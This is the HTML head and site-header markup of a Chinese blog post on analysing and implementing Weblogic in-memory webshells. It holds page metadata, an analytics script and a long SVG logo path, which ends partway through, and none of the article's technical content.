<!DOCTYPE html>
<html lang="zh-CN" data-theme="dark">
    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
    <meta charset="UTF-8" />

    <meta name="generator" content="Hugo 0.96.0" /><meta name="theme-color" content="#16171d" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
    
    <meta http-equiv="Cache-Control" content="no-transform" />
    
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <title>Weblogic 内存马分析与实现 | MYZXCG</title>

    <link rel="stylesheet" href="/css/meme.min.248ffc922f6c9975e8625f71e7ebc1a9e2180e744b9528665612bf7c124dea69.css"/>

    
    
        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>

    

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>

    <meta name="author" content="myzxcg" /><meta name="description" content="Filter Filter 加载过程分析 Weblogic Filter内存马和Tomcat其实差不多。 在weblogic.s……" />

    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="application-name" content="MYZXCG" />
    <meta name="msapplication-starturl" content="../../../" />
    <meta name="msapplication-TileColor" content="#603cba" />
    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
    <link rel="manifest" href="/manifest.json" />


    
    

    
    <link rel="canonical" href="https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" />
    

<script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "BlogPosting",
        "datePublished": "2021-11-06T22:02:36+08:00",
        "dateModified": "2021-11-20T14:00:01+08:00",
        "url": "https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/",
        "headline": "Weblogic 内存马分析与实现",
        "description": "Filter Filter 加载过程分析 Weblogic Filter内存马和Tomcat其实差不多。 在weblogic.s……",
        "inLanguage" : "zh-CN",
        "articleSection": "posts",
        "wordCount":  4967 ,
        "image": ["https://myzxcg.com/images/image-20211106220512.png","https://myzxcg.com/images/image-20211106220554.png","https://myzxcg.com/images/image-20211106220618.png","https://myzxcg.com/images/image-20211106220644.png","https://myzxcg.com/images/image-20211106220657.png","https://myzxcg.com/images/image-20211106220720.png","https://myzxcg.com/images/image-20211106220741.png","https://myzxcg.com/images/image-20211106220802.png","https://myzxcg.com/images/image-20211106220822.png","https://myzxcg.com/images/image-20211106220909.png","https://myzxcg.com/images/image-20211106220946.png","https://myzxcg.com/images/image-20211106221005.png","https://myzxcg.com/images/image-20211106221024.png","https://myzxcg.com/images/image-20211106221043.png","https://myzxcg.com/images/image-20211106221216.png","https://myzxcg.com/images/image-20211106221250.png","https://myzxcg.com/images/image-20211106221438.png"],
        "author": {
            "@type": "Person",
            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
            "email": "myzx.xcg@gmail.com",
            "image": "https://myzxcg.com/avatar.png",
            "url": "https://myzxcg.com/",
            "name": "myzxcg"
        },
        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
        "publisher": {
            "@type": "Organization",
            "name": "MYZXCG",
            "logo": {
                "@type": "ImageObject",
                "url": "https://myzxcg.com/icons/favicon.ico"
            },
            "url": "https://myzxcg.com/"
        },
        "mainEntityOfPage": {
            "@type": "WebSite",
            "@id": "https://myzxcg.com/"
        }
    }
</script>

    

<meta name="twitter:card" content="summary_large_image" />


<meta name="twitter:site" content="@myzxcg" />
<meta name="twitter:creator" content="@myzxcg" />

    



<meta property="og:title" content="Weblogic 内存马分析与实现" />
<meta property="og:description" content="Filter Filter 加载过程分析 Weblogic Filter内存马和Tomcat其实差不多。 在weblogic.s……" />
<meta property="og:url" content="https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" />
<meta property="og:site_name" content="MYZXCG" />
<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/image-20211106220512.png" />
<meta property="og:type" content="article" />
    <meta property="article:published_time" content="2021-11-06T22:02:36&#43;08:00" />
    <meta property="article:modified_time" content="2021-11-20T14:00:01&#43;08:00" />
    
    <meta property="article:section" content="posts" />


        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />

        


    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-Y0LZRMN44V');
    </script>




    
    

    
</head>

    <body>
        <div class="container">
            
    <header class="header">
        
            <div class="header-wrapper">
                <div class="header-inner single">
                    
    <div class="site-brand">
        
            <a href="/"><svg data-v-423bf9ae="" xmlns="http://www.w3.org/2000/svg" class="brand" viewBox="0 0 164.20314694661778 60" class="font"><!----><defs data-v-423bf9ae=""><linearGradient data-v-423bf9ae="" gradientTransform="rotate(25)" id="9d5bfb87-9af0-4056-b335-e722243993f9" x1="0%" y1="0%" x2="100%" y2="0%"><stop data-v-423bf9ae="" offset="0%" style="stop-color: rgb(87, 93, 96); stop-opacity: 1;"></stop><stop data-v-423bf9ae="" offset="100%" style="stop-color: rgb(246, 225, 205); stop-opacity: 1;"></stop></linearGradient></defs><!----><g data-v-423bf9ae="" id="2fa46697-71c2-43ec-b51a-6d9e651e9e88" fill="#ffffff" transform="matrix(4.687500279396789,0,0,4.687500279396789,-2.1562506803318087,-24.703126859851267)"><path d="M7.24 13.04L7.24 13.04L7.24 13.04Q7.26 13.09 7.27 13.13L7.27 13.13L7.27 13.13Q7.28 13.16 7.28 13.19L7.28 13.19L7.28 13.19Q7.28 13.25 7.23 13.27L7.23 13.27L7.23 13.27Q7.18 13.28 7.12 13.29L7.12 13.29L7.12 13.29Q7.11 13.30 7.10 13.35L7.10 13.35L7.10 13.35Q7.08 13.41 7.06 13.48L7.06 13.48L7.06 13.48Q7.03 13.55 6.98 13.60L6.98 13.60L6.98 13.60Q6.93 13.66 6.84 13.66L6.84 13.66L6.84 13.66Q6.56 13.64 6.39 13.53L6.39 13.53L6.39 13.53Q6.23 13.43 6.15 13.24L6.15 13.24L6.15 13.24Q6.06 13.06 6.04 12.80L6.04 12.80L6.04 12.80Q6.02 12.54 6.02 12.23L6.02 12.23L6.02 12.23Q6.02 11.86 6.05 11.46L6.05 11.46L6.05 11.46Q6.08 11.05 6.13 10.67L6.13 10.67L6.13 10.67Q6.17 10.29 6.20 9.95L6.20 9.95L6.20 9.95Q6.23 9.61 6.23 9.37L6.23 9.37L6.23 9.37Q6.23 9.02 6.17 8.83L6.17 8.83L6.17 8.83Q6.11 8.64 6.01 8.64L6.01 8.64L6.01 8.64Q5.96 8.64 5.76 8.92L5.76 8.92L5.76 8.92Q5.56 9.21 5.29 9.78L5.29 9.78L5.29 9.78Q5.01 10.36 4.69 11.22L4.69 11.22L4.69 11.22Q4.38 12.09 4.09 13.26L4.09 13.26L4.09 13.26Q4.07 13.31 4.07 13.36L4.07 13.36L4.07 13.36Q4.07 13.42 4.07 13.46L4.07 13.46L4.07 13.46Q4.06 13.51 4.04 13.54L4.04 13.54L4.04 13.54Q4.01 13.57 3.96 13.57L3.96 13.57L3.96 13.57Q3.87 13.57 3.81 13.53L3.81 13.53L3.81 13.53Q3.76 13.49 3.72 13.45L3.72 13.45L3.72 13.45Q3.68 13.41 3.64 13.37L3.64 13.37L3.64 13.37Q3.61 13.33 3.55 13.33L3.55 13.33L3.55 13.33Q3.53 13.33 3.52 13.36L3.52 13.36L3.52 13.36Q3.51 13.38 3.49 13.42L3.49 13.42L3.49 13.42Q3.47 13.46 3.44 13.49L3.44 13.49L3.44 13.49Q3.41 13.51 3.36 13.51L3.36 13.51L3.36 13.51Q3.32 13.51 3.27 13.50L3.27 13.50L3.27 13.50Q3.23 13.48 3.18 13.41L3.18 13.41L3.18 13.41Q3.13 13.34 3.10 13.20L3.10 13.20L3.10 13.20Q3.07 13.06 3.07 12.82L3.07 12.82L3.07 12.51L3.07 12.51Q3.07 12.41 3.09 12.21L3.09 12.21L3.09 12.21Q3.11 12.01 3.13 11.74L3.13 11.74L3.13 11.74Q3.16 11.48 3.19 11.17L3.19 11.17L3.19 11.17Q3.22 10.86 3.24 10.53L3.24 10.53L3.24 10.53Q3.27 10.21 3.28 9.91L3.28 9.91L3.28 9.91Q3.30 9.60 3.30 9.34L3.30 9.34L3.30 9.34Q3.30 8.57 3.11 8.57L3.11 8.57L3.11 8.57Q3.06 8.57 3.00 8.61L3.00 8.61L3.00 8.61Q2.94 8.64 2.85 8.75L2.85 8.75L2.85 8.75Q2.77 8.85 2.66 9.05L2.66 9.05L2.66 9.05Q2.54 9.24 2.40 9.57L2.40 9.57L2.40 9.57Q2.26 9.89 2.08 10.36L2.08 10.36L2.08 10.36Q1.90 10.83 1.68 11.48L1.68 11.48L1.68 11.48Q1.63 11.63 1.58 11.90L1.58 11.90L1.58 11.90Q1.52 12.18 1.47 12.47L1.47 12.47L1.47 12.47Q1.42 12.76 1.39 13.00L1.39 13.00L1.39 13.00Q1.36 13.24 1.36 13.32L1.36 13.32L1.36 13.32Q1.36 13.34 1.29 13.38L1.29 13.38L1.29 13.38Q1.22 13.43 1.12 13.47L1.12 13.47L1.12 13.47Q1.03 13.51 0.93 13.54L0.93 13.54L0.93 13.54Q0.83 13.57 0.77 13.57L0.77 13.57L0.77 13.57Q0.66 13.57 0.59 13.50L0.59 13.50L0.59 13.50Q0.53 13.44 0.50 13.27L0.50 13.27L0.50 13.27Q0.47 13.09 0.47 12.79L0.47 12.79L0.47 12.79Q0.46 12.48 0.46 12.00L0.46 12.00L0.46 12.00Q0.46 11.88 0.48 11.52L0.48 11.52L0.48 11.52Q0.49 11.16 0.51 10.68L0.51 10.68L0.51 10.68Q0.54 10.21 0.58 9.70L0.58 9.70L0.58 9.70Q0.62 9.18 0.68 8.75L0.68 8.75L0.68 8.75Q0.73 8.32 0.81 8.04L0.81 8.04L0.81 8.04Q0.88 7.76 0.98 7.76L0.98 7.76L0.98 7.76Q1.03 7.76 1.07 7.79L1.07 7.79L1.07 7.79Q1.11 7.83 1.14 7.86L1.14 7.86L1.14 7.86Q1.18 7.90 1.21 7.94L1.21 7.94L1.21 7.94Q1.24 7.97 1.27 7.97L1.27 7.97L1.27 7.97Q1.30 7.97 1.33 7.94L1.33 7.94L1.33 7.94Q1.36 7.92 1.38 7.88L1.38 7.88L1.38 7.88Q1.41 7.84 1.43 7.81L1.43 7.81L1.43 7.81Q1.46 7.79 1.47 7.79L1.47 7.79L1.47 7.79Q1.49 7.79 1.53 7.85L1.53 7.85L1.53 7.85Q1.57 7.92 1.61 8.02L1.61 8.02L1.61 8.02Q1.65 8.11 1.68 8.21L1.68 8.21L1.68 8.21Q1.71 8.31 1.71 8.36L1.71 8.36L1.71 8.36Q1.71 8.50 1.69 8.75L1.69 8.75L1.69 8.75Q1.66 9.00 1.63 9.31L1.63 9.31L1.63 9.31Q1.60 9.61 1.58 9.93L1.58 9.93L1.58 9.93Q1.55 10.24 1.55 10.51L1.55 10.51L1.55 10.53L1.55 10.53Q1.64 10.24 1.76 9.93L1.76 9.93L1.76 9.93Q1.88 9.62 2.02 9.32L2.02 9.32L2.02 9.32Q2.17 9.02 2.33 8.76L2.33 8.76L2.33 8.76Q2.49 8.49 2.67 8.29L2.67 8.29L2.67 8.29Q2.84 8.09 3.03 7.98L3.03 7.98L3.03 7.98Q3.21 7.86 3.40 7.86L3.40 7.86L3.40 7.86Q3.64 7.86 3.80 7.94L3.80 7.94L3.80 7.94Q3.97 8.02 4.07 8.16L4.07 8.16L4.07 8.16Q4.18 8.30 4.22 8.48L4.22 8.48L4.22 8.48Q4.27 8.66 4.27 8.87L4.27 8.87L4.27 8.87Q4.27 9.04 4.25 9.28L4.25 9.28L4.25 9.28Q4.22 9.51 4.20 9.79L4.20 9.79L4.20 9.79Q4.17 10.08 4.15 10.41L4.15 10.41L4.15 10.41Q4.12 10.75 4.12 11.15L4.12 11.15L4.12 11.15Q4.20 10.90 4.33 10.56L4.33 10.56L4.33 10.56Q4.46 10.21 4.61 9.84L4.61 9.84L4.61 9.84Q4.76 9.47 4.94 9.11L4.94 9.11L4.94 9.11Q5.11 8.75 5.29 8.46L5.29 8.46L5.29 8.46Q5.47 8.18 5.65 8.00L5.65 8.00L5.65 8.00Q5.83 7.82 6.00 7.82L6.00 7.82L6.00 7.82Q6.04 7.82 6.21 7.85L6.21 7.85L6.21 7.85Q6.38 7.88 6.57 7.94L6.57 7.94L6.57 7.94Q6.75 8.00 6.92 8.08L6.92 8.08L6.92 8.08Q7.08 8.17 7.14 8.28L7.14 8.28L7.14 8.28Q7.19 8.39 7.24 8.60L7.24 8.60L7.24 8.60Q7.28 8.81 7.28 9.16L7.28 9.16L7.28 9.16Q7.28 9.47 7.24 9.90L7.24 9.90L7.24 9.90Q7.19 10.32 7.08 10.92L7.08 10.92L7.08 10.92Q7.05 11.12 7.04 11.31L7.04 11.31L7.04 11.31Q7.03 11.49 7.03 11.67L7.03 11.67L7.03 11.67Q7.03 11.93 7.05 12.15L7.05 12.15L7.05 12.15Q7.08 12.38 7.11 12.56L7.11 12.56L7.11 12.56Q7.14 12.74 7.18 12.86L7.18 12.86L7.18 12.86Q7.21 12.99 7.24 13.04ZM13.92 7.93L13.92 7.93L13.92 7.93Q13.90 7.96 13.78 8.16L13.78 8.16L13.78 8.16Q13.66 8.35 13.47 8.65L13.47 8.65L13.47 8.65Q13.29 8.95 13.05 9.33L13.05 9.33L13.05 9.33Q12.82 9.71 12.57 10.11L12.57 10.11L12.57 10.11Q12.32 10.52 12.07 10.92L12.07 10.92L12.07 10.92Q11.83 11.33 11.61 11.68L11.61 11.68L11.61 11.68Q11.40 12.03 11.24 12.30L11.24 12.30L11.24 12.30Q11.08 12.58 11.01 12.71L11.01 12.71L11.01 12.71Q10.93 12.85 10.79 13.14L10.79 13.14L10.79 13.14Q10.66 13.43 10.48 13.80L10.48 13.80L10.48 13.80Q10.30 14.17 10.10 14.60L10.10 14.60L10.10 14.60Q9.90 15.03 9.70 15.47L9.70 15.47L9.70 15.47Q9.50 15.90 9.31 16.31L9.31 16.31L9.31 16.31Q9.12 16.71 8.97 17.04L8.97 17.04L8.97 17.04Q8.83 17.36 8.73 17.56L8.73 17.56L8.73 17.56Q8.63 17.77 8.62 17.81L8.62 17.81L8.62 17.81Q8.56 17.97 8.51 18.01L8.51 18.01L8.51 18.01Q8.46 18.05 8.36 18.07L8.36 18.07L8.36 18.07Q8.31 18.07 8.29 18.04L8.29 18.04L8.29 18.04Q8.26 18.01 8.24 17.96L8.24 17.96L8.24 17.96Q8.22 17.91 8.20 17.87L8.20 17.87L8.20 17.87Q8.18 17.83 8.15 17.83L8.15 17.83L8.15 17.83Q8.06 17.81 8.05 17.79L8.05 17.79L8.05 17.79Q8.04 17.77 8.00 17.70L8.00 17.70L8.00 17.70Q7.98 17.67 7.96 17.67L7.96 17.67L7.96 17.67Q7.94 17.66 7.92 17.66L7.92 17.66L7.92 17.66Q7.90 17.66 7.89 17.66L7.89 17.66L7.89 17.66Q7.88 17.65 7.88 17.62L7.88 17.62L7.88 17.62Q7.90 17.50 7.91 17.38L7.91 17.38L7.91 17.38Q7.92 17.27 7.94 17.17L7.94 17.17L7.94 17.17Q7.96 17.10 8.08 16.86L8.08 16.86L8.08 16.86Q8.20 16.62 8.37 16.27L8.37 16.27L8.37 16.27Q8.55 15.93 8.77 15.51L8.77 15.51L8.77 15.51Q9.00 15.09 9.23 14.65L9.23 14.65L9.23 14.65Q9.45 14.22 9.68 13.79L9.68 13.79L9.68 13.79Q9.90 13.37 10.08 13.02L10.08 13.02L10.08 13.02Q9.99 12.83 9.84 12.53L9.84 12.53L9.84 12.53Q9.69 12.22 9.51 11.85L9.51 11.85L9.51 11.85Q9.33 11.48 9.13 11.06L9.13 11.06L9.13 11.06Q8.93 10.64 8.74 10.23L8.74 10.23L8.74 10.23Q8.54 9.82 8.37 9.44L8.37 9.44L8.37 9.44Q8.19 9.06 8.06 8.75L8.06 8.75L8.06 8.75Q7.92 8.45 7.85 8.25L7.85 8.25L7.85 8.25Q7.77 8.05 7.77 8.00L7.77 8.00L7.77 8.00Q7.78 7.92 7.81 7.89L7.81 7.89L7.81 7.89Q7.83 7.85 7.88 7.85L7.88 7.85L7.88 7.85Q7.92 7.85 7.97 7.88L7.97 7.88L7.97 7.88Q8.03 7.90 8.08 7.92L8.08 7.92L8.08 7.92Q8.16 7.95 8.24 7.98L8.24 7.98L8.24 7.98Q8.31 8.01 8.35 7.96L8.35 7.96L8.35 7.96Q8.37 7.90 8.46 7.90L8.46 7.90L8.46 7.90Q8.56 7.90 8.62 7.93L8.62 7.93L8.62 7.93Q8.64 7.95 8.66 7.94L8.66 7.94L8.66 7.94Q8.67 7.94 8.69 7.92L8.69 7.92L8.69 7.92Q8.71 7.90 8.73 7.87L8.73 7.87L8.73 7.87Q8.76 7.85 8.79 7.83L8.79 7.83L8.79 7.83Q8.87 7.82 8.93 7.86L8.93 7.86L8.93 7.86Q8.99 7.90 9.04 8.04L9.04 8.04L9.04 8.04Q9.08 8.14 9.18 8.39L9.18 8.39L9.18 8.39Q9.29 8.65 9.44 8.98L9.44 8.98L9.44 8.98Q9.58 9.32 9.76 9.70L9.76 9.70L9.76 9.70Q9.94 10.09 10.12 10.46L10.12 10.46L10.12 10.46Q10.29 10.83 10.46 11.16L10.46 11.16L10.46 11.16Q10.62 11.49 10.74 11.71L10.74 11.71L10.74 11.71Q10.92 11.37 11.14 10.98L11.14 10.98L11.14 10.98Q11.35 10.60 11.58 10.21L11.58 10.21L11.58 10.21Q11.80 9.82 12.02 9.45L12.02 9.45L12.02 9.45Q12.24 9.08 12.43 8.77L12.43 8.77L12.43 8.77Q12.63 8.46 12.78 8.22L12.78 8.22L12.78 8.22Q12.93 7.98 13.02 7.86L13.02 7.86L13.02 7.86Q13.08 7.79 13.08 7.77L13.08 7.77L13.08 7.77Q13.08 7.75 13.13 7.73L13.13 7.73L13.13 7.73Q13.17 7.72 13.20 7.70L13.20 7.70L13.20 7.70Q13.23 7.69 13.30 7.70L13.30 7.70L13.30 7.70Q13.36 7.72 13.40 7.72L13.40 7.72L13.40 7.72Q13.43 7.72 13.45 7.76L13.45 7.76L13.45 7.76Q13.47 7.78 13.49 7.77L13.49 7.77L13.49 7.77Q13.52 7.77 13.56 7.75L13.56 7.75L13.56 7.75Q13.60 7.73 13.64 7.71L13.64 7.71L13.64 7.71Q13.68 7.70 13.72 7.70L13.72 7.70L13.72 7.70Q13.77 7.71 13.82 7.72L13.82 7.72L13.82 7.72Q13.86 7.73 13.90 7.76L13.90 7.76L13.90 7.76Q13.94 7.79 13.95 7.83L13.95 7.83L13.95 7.83Q13.95 7.87 13.92 7.93ZM18.94 8.25L18.94 8.25L18.94 8.25Q18.92 8.29 18.90 8.31L18.90 8.31L18.90 8.31Q18.89 8.33 18.86 8.35L18.86 8.35L18.86 8.35Q18.83 8.37 18.79 8.40L18.79 8.40L18.79 8.40Q18.75 8.44 18.69 8.49L18.69 8.49L18.69 8.49Q18.57 8.58 18.30 8.83L18.30 8.83L18.30 8.83Q18.03 9.08 17.66 9.43L17.66 9.43L17.66 9.43Q17.30 9.78 16.89 10.19L16.89 10.19L16.89 10.19Q16.47 10.60 16.08 11.02L16.08 11.02L16.08 11.02Q15.68 11.43 15.34 11.81L15.34 11.81L15.34 11.81Q15.00 12.18 14.78 12.46L14.78 12.46L14.78 12.46Q15.05 12.41 15.41 12.37L15.41 12.37L15.41 12.37Q15.77 12.32 16.15 12.29L16.15 12.29L16.15 12.29Q16.54 12.26 16.92 12.24L16.92 12.24L16.92 12.24Q17.29 12.22 17.61 12.22L17.61 12.22L17.61 12.22Q18.03 12.22 18.25 12.26L18.25 12.26L18.25 12.26Q18.37 12.27 18.45 12.34L18.45 12.34L18.45 12.34Q18.54 12.40 18.60 12.48L18.60 12.48L18.60 12.48Q18.66 12.55 18.69 12.63L18.69 12.63L18.69 12.63Q18.72 12.70 18.72 12.74L18.72 12.74L18.72 12.74Q18.72 12.80 18.72 12.86L18.72 12.86L18.72 12.86Q18.73 12.91 18.72 12.96L18.72 12.96L18.72 12.96Q18.71 13.01 18.67 13.05L18.67 13.05L18.67 13.05Q18.63 13.09 18.53 13.11L18.53 13.11L18.53 13.11Q18.48 13.13 18.41 13.11L18.41 13.11L18.41 13.11Q18.33 13.10 18.27 13.08L18.27 13.08L18.27 13.08Q18.20 13.07 18.14 13.06L18.14 13.06L18.14 13.06Q18.08 13.06 18.06 13.08L18.06 13.08L18.06 13.08Q17.99 13.18 18.03 13.25L18.03 13.25L18.03 13.25Q18.07 13.32 18.17 13.41L18.17 13.41L18.17 13.41Q18.22 13.44 18.20 13.48L18.20 13.48L18.20 13.48Q18.18 13.53 18.10 13.56L18.10 13.56L18.10 13.56Q18.03 13.58 17.91 13.58L17.91 13.58L17.91 13.58Q17.79 13.58 17.65 13.54L17.65 13.54L17.65 13.54Q17.59 13.52 17.44 13.51L17.44 13.51L17.44 13.51Q17.29 13.49 17.09 13.48L17.09 13.48L17.09 13.48Q16.89 13.47 16.64 13.47L16.64 13.47L16.64 13.47Q16.39 13.46 16.13 13.46L16.13 13.46L16.13 13.46Q15.78 13.46 15.43 13.47L15.43 13.47L15.43 13.47Q15.08 13.48 14.77 13.50L14.77 13.50L14.77 13.50Q14.46 13.52 14.23 13.56L14.23 13.56L14.23 13.56Q13.99 13.59 13.87 13.64L13.87 13.64L13.87 13.64Q13.73 13.71 13.66 13.70L13.66 13.70L13.66 13.70Q13.59 13.69 13.51 13.61L13.51 13.61L13.51 13.61Q13.47 13.57 13.44 13.52L13.44 13.52L13.44 13.52Q13.40 13.48 13.38 13.44L13.38 13.44L13.38 13.44Q13.36 13.40 13.38 13.36L13.38 13.36L13.38 13.36Q13.40 13.32 13.47 13.30L13.47 13.30L13.47 13.30Q13.53 13.29 13.53 13.25L13.53 13.25L13.53 13.25Q13.54 13.21 13.51 13.17L13.51 13.17L13.51 13.17Q13.49 13.13 13.47 13.09L13.47 13.09L13.47 13.09Q13.44 13.04 13.44 13.01L13.44 13.01L13.44 13.01Q13.45 12.95 13.63 12.72L13.63 12.72L13.63 12.72Q13.82 12.49 14.13 12.15L14.13 12.15L14.13 12.15Q14.44 11.81 14.85 11.39L14.85 11.39L14.85 11.39Q15.26 10.97 15.70 10.53L15.70 10.53L15.70 10.53Q16.14 10.08 16.58 9.64L16.58 9.64L16.58 9.64Q17.03 9.19 17.42 8.81L17.42 8.81L17.42 8.81Q17.23 8.79 16.96 8.78L16.96 8.78L16.96 8.78Q16.69 8.77 16.39 8.77L16.39 8.77L16.39 8.77Q16.13 8.77 15.87 8.78L15.87 8.78L15.87 8.78Q15.61 8.78 15.38 8.79L15.38 8.79L15.38 8.79Q15.15 8.80 14.97 8.82L14.97 8.82L14.97 8.82Q14.80 8.83 14.71 8.84L14.71 8.84L14.71 8.84Q14.62 8.85 14.57 8.84L14.57 8.84L14.57 8.84Q14.53 8.83 14.52 8.81L14.52 8.81L14.52 8.81Q14.51 8.78 14.50 8.75L14.50 8.75L14.50 8.75Q14.50 8.72 14.49 8.70L14.49 8.70L14.49 8.70Q14.46 8.68 14.43 8.66L14.43 8.66L14.43 8.66Q14.40 8.64 14.38 8.61L14.38 8.61L14.38 8.61Q14.36 8.59 14.36 8.56L14.36 8.56L14.36 8.56Q14.35 8.52 14.38 8.49L14.38 8.49L14.38 8.49Q14.40 8.46 14.39 8.44L14.39 8.44L14.39 8.44Q14.37 8.42 14.34 8.40L14.34 8.40L14.34 8.40Q14.31 8.39 14.29 8.36L14.29 8.36L14.29 8.36Q14.26 8.33 14.26 8.29L14.26 8.29L14.26 8.29Q14.26 8.22 14.26 8.15L14.26 8.15L14.26 8.15Q14.27 8.08 14.32 8.07L14.32 8.07L14.32 8.07Q14.38 8.05 14.38 8.00L14.38 8.00L14.38 8.00Q14.39 7.94 14.49 7.89L14.49 7.89L14.49 7.89Q14.57 7.83 14.76 7.80L14.76 7.80L14.76 7.80Q14.94 7.77 15.19 7.75L15.19 7.75L15.19 7.75Q15.44 7.73 15.74 7.72L15.74 7.72L15.74 7.72Q16.04 7.72 16.37 7.72L16.37 7.72L16.37 7.72Q16.69 7.72 17.01 7.72L17.01 7.72L17.01 7.72Q17.34 7.72 17.63 7.73L17.63 7.73L17.63 7.73Q17.93 7.74 18.19 7.74L18.19 7.74L18.19 7.74Q18.44 7.75 18.63 7.75L18.63 7.75L18.63 7.75Q18.69 7.75 18.76 7.80L18.76 7.80L18.76 7.80Q18.83 7.85 18.88 7.93L18.88 7.93L18.88 7.93Q18.94 8.00 18.96 8.09L18.96 8.09L18.96 8.09Q18.98 8.18 18.94 8.25ZM23.63 13.04L23.63 13.04L23.63 13.04Q23.68 13.10 23.67 13.16L23.67 13.16L23.67 13.16Q23.65 13.22 23.61 13.27L23.61 13.27L23.61 13.27Q23.57 13.32 23.51 13.34L23.51 13.34L23.51 13.34Q23.45 13.36 23.41 13.34L23.41 13.34L23.41 13.34Q23.31 13.32 23.20 13.36L23.20 13.36L23.20 13.36Q23.10 13.40 23.06 13.43L23.06 13.43L23.06 13.43Q23.02 13.47 23.04 13.52L23.04 13.52L23.04 13.52Q23.06 13.57 23.10 13.62L23.10 13.62L23.10 13.62Q23.15 13.69 23.11 13.77L23.11 13.77L23.11 13.77Q23.06 13.85 22.96 13.84L22.96 13.84L22.96 13.84Q22.92 13.84 22.81 13.71L22.81 13.71L22.81 13.71Q22.70 13.58 22.54 13.38L22.54 13.38L22.54 13.38Q22.39 13.19 22.21 12.93L22.21 12.93L22.21 12.93Q22.03 12.67 21.85 12.41L21.85 12.41L21.85 12.41Q21.67 12.15 21.50 11.89L21.50 11.89L21.50 11.89Q21.33 11.64 21.21 11.44L21.21 11.44L21.21 11.44Q21.06 11.63 20.87 11.85L20.87 11.85L20.87 11.85Q20.69 12.07 20.50 12.30L20.50 12.30L20.50 12.30Q20.31 12.53 20.13 12.75L20.13 12.75L20.13 12.75Q19.95 12.96 19.80 13.13L19.80 13.13L19.80 13.13Q19.66 13.30 19.56 13.40L19.56 13.40L19.56 13.40Q19.47 13.51 19.45 13.51L19.45 13.51L19.45 13.51Q19.37 13.56 19.32 13.62L19.32 13.62L19.32 13.62Q19.27 13.69 19.17 13.71L19.17 13.71L19.17 13.71Q19.12 13.72 19.08 13.70L19.08 13.70L19.08 13.70Q19.04 13.69 19.01 13.66L19.01 13.66L19.01 13.66Q18.98 13.64 18.94 13.62L18.94 13.62L18.94 13.62Q18.91 13.60 18.87 13.61L18.87 13.61L18.87 13.61Q18.81 13.61 18.77 13.50L18.77 13.50L18.77 13.50Q18.74 13.40 18.83 13.26L18.83 13.26L18.83 13.26Q18.84 13.25 18.94 13.12L18.94 13.12L18.94 13.12Q19.04 13.00 19.21 12.79L19.21 12.79L19.21 12.79Q19.37 12.59 19.57 12.34L19.57 12.34L19.57 12.34Q19.78 12.09 20.00 11.82L20.00 11.82L20.00 11.82Q20.21 11.56 20.43 11.31L20.43 11.31L20.43 11.31Q20.64 11.05 20.82 10.86L20.82 10.86L20.82 10.86Q20.60 10.55 20.35 10.17L20.35 10.17L20.35 10.17Q20.10 9.78 19.86 9.43L19.86 9.43L19.86 9.43Q19.62 9.08 19.43 8.81L19.43 8.81L19.43 8.81Q19.24 8.54 19.17 8.46L19.17 8.46L19.17 8.46Q19.09 8.39 19.05 8.33L19.05 8.33L19.05 8.33Q19.02 8.27 19.01 8.23L19.01 8.23L19.01 8.23Q19.00 8.19 19.07 8.18L19.07 8.18L19.07 8.18Q19.10 8.18 19.11 8.15L19.11 8.15L19.11 8.15Q19.12 8.11 19.13 8.08L19.13 8.08L19.13 8.08Q19.14 8.05 19.15 8.03L19.15 8.03L19.15 8.03Q19.17 8.00 19.21 7.98L19.21 7.98L19.21 7.98Q19.28 7.96 19.41 7.96L19.41 7.96L19.41 7.96Q19.54 7.96 19.61 7.93L19.61 7.93L19.61 7.93Q19.70 7.91 19.73 7.93L19.73 7.93L19.73 7.93Q19.76 7.95 19.82 8.01L19.82 8.01L19.82 8.01Q19.84 8.04 19.85 8.03L19.85 8.03L19.85 8.03Q19.85 8.03 19.85 8.00L19.85 8.00L19.85 8.00Q19.85 7.98 19.86 7.96L19.86 7.96L19.86 